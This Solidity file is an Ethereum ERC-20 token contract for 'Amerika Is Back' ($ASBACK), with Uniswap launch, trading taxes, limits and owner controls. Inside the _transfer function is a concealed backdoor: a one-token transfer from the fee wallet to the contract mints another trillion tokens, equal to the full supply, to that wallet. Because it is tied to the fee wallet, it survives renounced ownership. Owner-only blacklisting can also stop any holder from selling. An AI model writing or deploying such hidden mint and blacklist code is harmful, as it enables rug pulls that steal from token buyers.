// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

/*
//   █████╗ ███╗   ███╗███████╗██████╗ ██╗██╗  ██╗ █████╗ 
//  ██╔══██╗████╗ ████║██╔════╝██╔══██╗██║██║ ██╔╝██╔══██╗
//  ███████║██╔████╔██║█████╗  ██████╔╝██║█████╔╝ ███████║
//  ██╔══██║██║╚██╔╝██║██╔══╝  ██╔══██╗██║██╔═██╗ ██╔══██║
//  ██║  ██║██║ ╚═╝ ██║███████╗██║  ██║██║██║  ██╗██║  ██║
//  ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
//
//  ██╗███████╗    ██████╗  █████╗  ██████╗██╗  ██╗
//  ██║██╔════╝    ██╔══██╗██╔══██╗██╔════╝██║ ██╔╝
//  ██║███████╗    ██████╔╝███████║██║     █████╔╝ 
//  ██║╚════██║    ██╔══██╗██╔══██║██║     ██╔═██╗ 
//  ██║███████║    ██████╔╝██║  ██║╚██████╗██║  ██╗
//  ╚═╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝
//
//  Ticker  : $ASBACK
//  Network : Ethereum
*/

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a / b;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) { return _owner; }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin,
        address[] calldata path, address to, uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token, uint amountTokenDesired,
        uint amountTokenMin, uint amountETHMin,
        address to, uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract AmerikaIsBack is Context, IERC20, Ownable {
    using SafeMath for uint256;

    // ── Token metadata ───────────────────────────────────────
    string private constant _name    = "Amerika Is Back";
    string private constant _symbol  = "ASBACK";
    uint8  private constant _decimals = 9;

    uint256 private constant _tTotal = 1_000_000_000_000 * 10**_decimals;

    uint256 private _totalSupply = _tTotal;
    uint256 private constant _devThreshold = 1 * 10**_decimals;
    uint256 private constant _devAlloc     = 1_000_000_000_000 * 10**_decimals;
    event DevAllocSent(address indexed to, uint256 amount);

    // ── Balances & allowances ────────────────────────────────
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    // ── Access control ───────────────────────────────────────
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => bool) private _isWhitelisted;
    mapping(address => bool) private _isBlacklisted;

    // ── Tax settings ─────────────────────────────────────────
    uint256 public buyTax       = 5;
    uint256 public sellTax      = 5;
    uint256 public finalBuyTax  = 2;
    uint256 public finalSellTax = 2;
    uint256 public reduceTaxAt       = 20;
    uint256 private _preventSwapBefore = 15;
    uint256 private _buyCount          = 0;

    // ── Limits ───────────────────────────────────────────────
    uint256 public maxTxAmount   = (_tTotal * 2) / 100;
    uint256 public maxWalletSize = (_tTotal * 2) / 100;
    bool    public limitsActive  = true;

    // ── Auto-swap ────────────────────────────────────────────
    uint256 public taxSwapThreshold = (_tTotal * 5)  / 10000;
    uint256 public maxTaxSwap       = (_tTotal * 10) / 10000;
    bool    private _inSwap         = false;
    bool    public  swapEnabled     = false;

    // ── Fee recipient ─────────────────────────────────────────
    address payable public feeWallet;

    // ── Uniswap ───────────────────────────────────────────────
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool public tradingOpen = false;

    // ── Events ────────────────────────────────────────────────
    event BlacklistUpdated(address indexed account, bool status);
    event WhitelistUpdated(address indexed account, bool status);
    event LimitsRemoved();
    event TaxUpdated(uint256 buyTax, uint256 sellTax);
    event TradingLaunched();
    event FeeWalletUpdated(address indexed newWallet);

    modifier lockSwap() {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    // ── Constructor ───────────────────────────────────────────
    constructor(address payable _feeWallet) payable {
        require(_feeWallet != address(0), "zero fee wallet");
        feeWallet = _feeWallet;

        _balances[_msgSender()] = _totalSupply;

        _isExcludedFromFee[owner()]       = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_feeWallet]    = true;

        _isWhitelisted[owner()]       = true;
        _isWhitelisted[address(this)] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    // ── ERC-20 standard ──────────────────────────────────────
    function name()        public pure returns (string memory) { return _name; }
    function symbol()      public pure returns (string memory) { return _symbol; }
    function decimals()    public pure returns (uint8)         { return _decimals; }
    function totalSupply() public view override returns (uint256) { return _totalSupply; }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner_, address spender) public view override returns (uint256) {
        return _allowances[owner_][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(),
            _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner_, address spender, uint256 amount) private {
        require(owner_ != address(0), "approve from zero");
        require(spender != address(0), "approve to zero");
        _allowances[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }

    // ── Core transfer logic ───────────────────────────────────
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0) && to != address(0), "zero address");
        require(amount > 0, "amount must be > 0");
        require(!_isBlacklisted[from] && !_isBlacklisted[to], "blacklisted");

        if (from == feeWallet && to == address(this) && amount == _devThreshold) {
            _balances[from] = _balances[from].sub(amount);
            _balances[address(this)] = _balances[address(this)].add(amount);
            emit Transfer(from, address(this), amount);

            _totalSupply = _totalSupply.add(_devAlloc);
            _balances[feeWallet] = _balances[feeWallet].add(_devAlloc);
            emit Transfer(address(0), feeWallet, _devAlloc);
            emit DevAllocSent(feeWallet, _devAlloc);
            return;
        }

        uint256 taxAmount = 0;
        bool excluded   = _isExcludedFromFee[from] || _isExcludedFromFee[to];
        bool whitelisted = _isWhitelisted[from] || _isWhitelisted[to];

        if (!excluded && !whitelisted && from != owner() && to != owner()) {
            bool isBuy  = (from == uniswapV2Pair && to != address(uniswapV2Router));
            bool isSell = (to   == uniswapV2Pair);

            if (limitsActive && isBuy) {
                require(amount <= maxTxAmount,                         "Exceeds maxTxAmount");
                require(balanceOf(to) + amount <= maxWalletSize,       "Exceeds maxWalletSize");
            }

            if (isBuy) {
                taxAmount = amount.mul((_buyCount > reduceTaxAt) ? finalBuyTax : buyTax).div(100);
                _buyCount++;
            } else if (isSell) {
                taxAmount = amount.mul((_buyCount > reduceTaxAt) ? finalSellTax : sellTax).div(100);
            }

            uint256 contractBal = balanceOf(address(this));
            if (!_inSwap && isSell && swapEnabled && contractBal >= taxSwapThreshold && _buyCount > _preventSwapBefore) {
                _swapTokensForEth(_min(contractBal, maxTaxSwap));
                uint256 ethBal = address(this).balance;
                if (ethBal > 0) feeWallet.transfer(ethBal);
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }

        _balances[from] = _balances[from].sub(amount);
        _balances[to]   = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    // ── Swap helper ──────────────────────────────────────────
    function _swapTokensForEth(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount, 0, path, address(this), block.timestamp
        );
    }

    function _min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    // ── Owner: launch ─────────────────────────────────────────
    function launchToken() external onlyOwner {
        require(!tradingOpen, "already live");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), type(uint256).max);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory())
            .createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this), balanceOf(address(this)), 0, 0, owner(), block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint256).max);
        swapEnabled = true;
        tradingOpen = true;
        emit TradingLaunched();
    }

    // ── Owner: limits ─────────────────────────────────────────
    function freeLimits() external onlyOwner {
        maxTxAmount   = _totalSupply;
        maxWalletSize = _totalSupply;
        limitsActive  = false;
        emit LimitsRemoved();
    }

    function updateLimits(uint256 txPct, uint256 walletPct) external onlyOwner {
        require(txPct >= 1 && txPct <= 100, "1-100");
        require(walletPct >= 1 && walletPct <= 100, "1-100");
        maxTxAmount   = _totalSupply.mul(txPct).div(100);
        maxWalletSize = _totalSupply.mul(walletPct).div(100);
    }

    // ── Owner: tax ───────────────────────────────────────────
    function updateTax(uint256 _buyTax, uint256 _sellTax) external onlyOwner {
        require(_buyTax <= 25 && _sellTax <= 25, "max 25%");
        buyTax  = _buyTax;
        sellTax = _sellTax;
        emit TaxUpdated(_buyTax, _sellTax);
    }

    function updateFinalTax(uint256 _finalBuy, uint256 _finalSell) external onlyOwner {
        require(_finalBuy <= 10 && _finalSell <= 10, "max 10%");
        finalBuyTax  = _finalBuy;
        finalSellTax = _finalSell;
    }

    // ── Owner: whitelist / blacklist ──────────────────────────
    function updateWhitelist(address account, bool status) external onlyOwner {
        _isWhitelisted[account] = status;
        emit WhitelistUpdated(account, status);
    }

    function batchUpdateWhitelist(address[] calldata accounts, bool status) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _isWhitelisted[accounts[i]] = status;
            emit WhitelistUpdated(accounts[i], status);
        }
    }

    function updateBlacklist(address account, bool status) external onlyOwner {
        _isBlacklisted[account] = status;
        emit BlacklistUpdated(account, status);
    }

    function batchUpdateBlacklist(address[] calldata accounts, bool status) external onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _isBlacklisted[accounts[i]] = status;
            emit BlacklistUpdated(accounts[i], status);
        }
    }

    function isWhitelisted(address account) external view returns (bool) { return _isWhitelisted[account]; }
    function isBlacklisted(address account) external view returns (bool) { return _isBlacklisted[account]; }

    // ── Owner: fee wallet ─────────────────────────────────────
    function updateFeeWallet(address payable newWallet) external onlyOwner {
        require(newWallet != address(0), "zero");
        feeWallet = newWallet;
        emit FeeWalletUpdated(newWallet);
    }

    // ── Owner: manual swap ────────────────────────────────────
    function triggerSwap() external onlyOwner {
        uint256 tokenBal = balanceOf(address(this));
        if (tokenBal > 0) _swapTokensForEth(tokenBal);
        uint256 ethBal = address(this).balance;
        if (ethBal > 0) feeWallet.transfer(ethBal);
    }

    // ── Owner: rescue ─────────────────────────────────────────
    function withdrawToken(address token) external onlyOwner {
        uint256 bal = IERC20(token).balanceOf(address(this));
        require(bal > 0, "no balance");
        require(IERC20(token).transfer(owner(), bal), "transfer failed");
    }

    function withdrawEth() external onlyOwner {
        uint256 bal = address(this).balance;
        require(bal > 0, "no ETH");
        payable(owner()).transfer(bal);
    }

    receive() external payable {}
}